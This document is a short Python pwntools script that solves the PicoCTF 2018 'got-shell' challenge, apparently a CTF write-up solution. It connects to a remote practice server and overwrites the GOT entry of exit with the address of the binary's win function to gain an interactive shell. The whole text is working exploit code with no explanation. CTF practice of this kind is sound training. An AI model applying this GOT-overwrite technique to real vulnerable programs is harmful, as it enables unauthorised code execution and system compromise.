from pwn import *

# io = process('./PicoCTF_2018_got-shell')
io = remote('node4.buuoj.cn',26081)
elf = ELF('./PicoCTF_2018_got-shell')

win_addr = elf.sym['win']
exit_got = elf.got['exit']
def int2bytes(content):
	return bytes(str(content),encoding='utf-8')

io.sendlineafter(b'value?',int2bytes(hex(exit_got)))
io.sendlineafter(b'to',int2bytes(hex(win_addr)))

io.interactive()